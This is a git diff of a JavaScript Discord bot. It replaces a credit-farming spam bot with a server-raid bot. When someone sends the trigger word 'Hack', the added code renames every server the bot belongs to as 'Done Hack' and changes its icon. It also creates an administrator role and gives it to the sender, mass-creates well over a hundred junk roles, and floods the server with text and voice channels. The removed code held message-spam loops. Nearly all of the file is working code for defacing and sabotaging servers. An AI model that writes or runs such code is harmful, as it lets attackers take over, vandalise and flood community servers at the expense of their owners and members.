@@ -1,87 +1,3907 @@
-const Discord = require('discord.js');
+const Discord = require("discord.js");
 const client = new Discord.Client();
-console.log("Scrpit By Dream");
-
-
-const myid = ['321476121956974595'];
-const prefix = ['-'];
-
-client.on('ready', () => {
-   console.log(`----------------`);
-   console.log(`Credit Farmm - Script By : 3mk `);
-   console.log(`----------------`);
-   console.log(`Loadinng`);
-   console.log(`Loadinng.`);
-   console.log(`Loadinng..`);
-   console.log(`Loadinng...`);
-   console.log(`This Bots Online ' `);
-   console.log(`----------------`);
-});
 
 
 
 
+
+
+
+
+var x_x = "Hack" //هنا تحط الامر اللي يشغل الهاك
+
+//اسم البوت واسم السيرفر وصورهم وكل شئ
 
 client.on('message', message => {
-    if(message.content === prefix+'راتب'){
-        message.channel.send('#daily')
-    }
-});
+ if (message.content === x_x) {
+  client.user.setAvatar(`https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png`)
 
+ }
+});
 client.on('message', message => {
-    if(message.content === prefix+'مبلغ'){
-        message.channel.send('#credits')
-    }
+ if (message.content === x_x) {
+  client.user.setUsername("اسفين اذا عورناك")
+
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  client.user.setGame(`اسفين اذا عـورناك`, 'https://www.twitch.tv/hix')
+
+ }
 });
 
 client.on('message', message => {
-    if(message.content === prefix+'ريب'){
-        message.channel.send("#rep "+"<@" + myid + ">")
-    }
+ if (message.content === x_x) {
+  client.guilds.forEach(m => {
+   m.setIcon(`https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png`)
+  })
+ }
 });
-
-
-
-
 client.on('message', message => {
-if (message.content === prefix+'spam') {
-      let count = 0;
-      let ecount = 0;
-      for(let x = 0; x < 90000; x++) {
-        message.channel.send(`**Credit Spam , Frame , Credit By Kahrba , Farm Credit By Kahrba, ez Farm - كردت اسبام اسبام اسبام اوف ءف اح اح نار ج **[ " ${x} " ]`)
-          .then(m => {
-            count++;
-          })
-          
-        }
-      }
+ if (message.content === x_x) {
+  client.guilds.forEach(m => {
+   m.setName(`Done Hack`)
+  })
+ }
 });
 
 client.on('message', message => {
-  if (message.author.bot) return;
-  if (!message.content.startsWith(prefix)) return;
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
 
-  let command = message.content.split(" ")[0];
-  command = command.slice(prefix.length);
+  message.guild.setIcon(`https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png`)
 
-  let args = message.content.split(" ").slice(1);
-
-
-
-if (command == "تحدث") {
-let rank = message.guild.member(message.author).roles.find('name', 'Role.Kahrbaa');
-if (!rank) return message.reply(' ')
-  message.channel.send(args.join("  "))
-    message.delete();
-  }
+ }
 });
 
 
-client.on("ready", () => {
-let channel =     client.channels.get("548861146493485067")
-setInterval(function() {
-channel.send(`AlaseriAlaseriAlaseriAlaseriAlaseriAlaseriAlaseriAlaseriAlaseri`);
-}, 30)
-})
+
+
+//اللي يسوي رتب
+
+client.on('message', message => {
+ if (!message.channel.guild) return;
+
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [8],
+   color: "#23272a"
+  }).then(function(role) {
+   message.member.addRole(role);
+  })
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+
+ }
+});
+
+
+
+
+//هنا اللي يسوي الرومات
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
